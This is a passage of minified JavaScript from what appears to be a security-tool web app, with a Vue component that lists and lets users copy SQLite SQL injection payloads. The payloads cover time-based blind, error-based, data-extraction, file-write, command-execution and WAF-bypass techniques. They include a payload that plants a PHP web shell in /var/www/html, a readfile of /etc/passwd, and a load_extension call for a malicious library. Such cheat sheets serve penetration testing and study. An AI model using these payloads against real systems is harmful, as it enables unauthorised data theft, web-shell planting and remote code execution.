LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END)--"},{id:"lite-bt-3",name:"逐字符时间提取",payload:"' AND (SELECT CASE WHEN (UNICODE(SUBSTR(sqlite_version(),1,1))>50) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END)--"}]},{id:"error_based",name:"报错注入",nameEn:"Error Based",payloads:[{id:"lite-err-1",name:"CAST 类型报错",payload:"' AND 1=CAST((SELECT tbl_name FROM sqlite_master LIMIT 1) AS INT)--"},{id:"lite-err-2",name:"ABS 报错 (溢出)",payload:"' AND ABS(-9223372036854775808)--",description:"SQLite 3.33.0+ 以前版本"}]},{id:"data_extraction",name:"数据提取",nameEn:"Data Extraction",payloads:[{id:"lite-de-1",name:"列出所有表",payload:"SELECT tbl_name FROM sqlite_master WHERE type='table'"},{id:"lite-de-2",name:"列出表 (GROUP_CONCAT)",payload:"SELECT GROUP_CONCAT(tbl_name,',') FROM sqlite_master WHERE type='table'"},{id:"lite-de-3",name:"获取建表语句 (含列信息)",payload:"SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='users'"},{id:"lite-de-4",name:"PRAGMA 获取列信息",payload:"PRAGMA table_info('users')"},{id:"lite-de-5",name:"提取所有索引",payload:"SELECT name,tbl_name FROM sqlite_master WHERE type='index'"}]},{id:"file_ops",name:"文件操作",nameEn:"File Operations",payloads:[{id:"lite-file-1",name:"ATTACH 创建新数据库文件",payload:`ATTACH DATABASE '/var/www/html/shell.php' AS pwned; CREATE TABLE pwned.cmd(data TEXT); INSERT INTO pwned.cmd VALUES('<?php system($_GET["cmd"]); ?>');`,description:"需要写权限"},{id:"lite-file-2",name:"数据库文件路径",payload:"PRAGMA database_list"},{id:"lite-file-3",name:"readfile 扩展",payload:"SELECT readfile('/etc/passwd')",description:"需要加载 fileio 扩展"}]},{id:"command_exec",name:"命令执行",nameEn:"Command Execution",payloads:[{id:"lite-cmd-1",name:"LOAD_EXTENSION 加载库",payload:"SELECT load_extension('/tmp/malicious.so','entry_func')",description:"默认禁用，需要编译时启用"}]},{id:"comments",name:"注释符",nameEn:"Comments",payloads:[{id:"lite-cmt-1",name:"单行注释 (--)",payload:"-- 注释内容"},{id:"lite-cmt-2",name:"多行注释",payload:"/* 注释内容 */"}]},{id:"waf_bypass",name:"WAF 绕过",nameEn:"WAF Bypass",payloads:[{id:"lite-waf-1",name:"注释分隔绕过",payload:"'/**/UNION/**/SELECT/**/NULL,sqlite_version(),NULL--"},{id:"lite-waf-2",name:"CHAR 编码",payload:"SELECT CHAR(65,66,67)"},{id:"lite-waf-3",name:"十六进制值",payload:"SELECT X'41424344'"},{id:"lite-waf-4",name:"大小写混合",payload:"' uNiOn SeLeCt NULL,sqlite_version(),NULL--"}]}]},y=[x,W,X,$,Y],V={class:"sectool-sqli-section-title"},j=q({__name:"Sqli",async setup(J){let p,_;const A=y.map(a=>({value:a.id,label:a.name})),n=B(([p,_]=h(()=>{var a;return f({selectedDb:((a=y[0])==null?void 0:a.id)||"mysql",selectedSection:"all",search:""})}),p=await p,_(),p)),s=N(()=>y.find(a=>a.id===n.current.selectedDb)||y[0]),U=N(()=>{const a=[{value:"all",label:$t("sqli_section_all")}];if(s.value)for(const e of s.value.sections)a.push({value:e.id,label:e.name});return a}),L=N(()=>n.current.search.toLowerCase()),u=N(()=>{if(!s.value)return[];const a=n.current.selectedSection==="all"?s.value.sections:s.value.sections.filter(e=>e.id===n.current.selectedSection);return L.value?a.map(e=>({id:e.id,name:e.name,nameEn:e.nameEn,payloads:e.payloads.filter(d=>d.name.toLowerCase().includes(L.value)||d.payload.toLowerCase().includes(L.value)||d.description&&d.description.toLowerCase().includes(L.value))})).filter(e=>e.payloads.length>0):a});return(a,e)=>{const d=i("Select"),b=i("Input"),c=i("Align"),I=i("Display"),D=i("Textarea"),M=i("HeightResize"),F=G("row");return w((t(),r("div",null,[o(c,{direction:"vertical"},{default:S(()=>[o(I,null,{default:S(()=>[o(c,{direction:"vertical"},{default:S(()=>[o(d,{modelValue:l(n).current.selectedDb,"onUpdate:modelValue":e[0]||(e[0]=E=>l(n).current.selectedDb=E),label:a.$t("sqli_database"),options:l(A)},null,8,["modelValue","label","options"]),o(d,{modelValue:l(n).current.selectedSection,"onUpdate:modelValue":e[1]||(e[1]=E=>l(n).current.selectedSection=E),label:a.$t("sqli_section"),options:U.value},null,8,["modelValue","label","options"]),o(b,{modelValue:l(n).current.search,"onUpdate:modelValue":e[2]||(e[2]=E=>l(n).current.search=E),label:a.$t("sqli_search"),placeholder:a.$t("sqli_search_placeholder")},null,8,["modelValue","label","placeholder"])]),_:1})]),_:1})]),_:1}),o(M,null,{default:S(({height:E})=>[O("div",{style:v({height:E+"px",overflowY:"auto"})},[(t(!0),r(C,null,R(u.value,T=>(t(),r(C,{key:T.id},[O("div",V,g(T.name),1),(t(!0),r(C,null,R(T.payloads,m=>(t(),P(D,{key:m.id,"model-value":m.payload,height:52,placeholder:m.name+(m.description?" — "+m.description:""),copy:m.name},null,8,["model-value","placeholder","copy"]))),128))],64))),128))],4)]),_:1})])),[[F,"10-14"]])}}}),ea=H(j,[["__scopeId","data-v-55ddd7fd"]]);export{ea as default};
